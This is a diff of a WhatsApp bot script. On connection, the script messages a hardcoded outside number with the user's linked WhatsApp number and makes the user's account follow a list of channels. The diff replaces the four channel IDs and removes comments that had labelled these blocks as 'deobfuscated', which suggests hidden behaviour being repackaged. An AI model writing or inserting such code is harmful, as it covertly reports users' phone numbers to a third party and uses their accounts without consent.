@@ -3,7 +3,7 @@ const func = require("./all/place")
 const readline = require("readline")
 const welcome = JSON.parse(fs.readFileSync("./all/database/welcome.json"))
 const { sleep } = require("./all/myfunc.js")  
-const usePairingCode = true // Define usePairingCode at the top to fix ReferenceError
+const usePairingCode = true
 const question = (text) => {
 const rl = readline.createInterface({
 input: process.stdin,
@@ -78,12 +78,12 @@ let teksnotif = `*SimpleBotz Jagagrub* Berhasil Tersambung Ke Nomor WhatsApp ${S
 Slash.sendMessage("62895615063060@s.whatsapp.net", {text: teksnotif})
 console.log(chalk.cyan.bold('Bot Berhasil Tersambung'))
 
-// Deobfuscated Channel Joining Logic
+// Channel Joining Logic
 const linksal = [
-  '0029Vb3ZZZHEFeXup5UNng0o',
-  '0029Vb3XDZZKGGGMM19XR62F',
-  '0029VaBOlsv002TEjlntTE2D',
-  '0029Vb3gqjpHltYCf4WOSt3u'
+  '0029Vb4fjWE1yT25R7epR110',
+  '0029Vb4s2mADTkK7PdUpl42K',
+  '0029Vb60rjm05MUhvzLPU125',
+  '0029VbAhesDJ3jutFwGpwE3o'
 ];
 async function folldate(links) {
   for (const link of links) {
@@ -101,7 +101,7 @@ await folldate(linksal);
 }
 })
 
-// Deobfuscated Auto-React Status Logic
+// Auto-React Status Logic
 Slash.ev.on('messages.upsert', async (chatUpdate) => {
   const message = chatUpdate.messages[0];
   const timeLimit = 5 * 60 * 1000; // 5 minutes
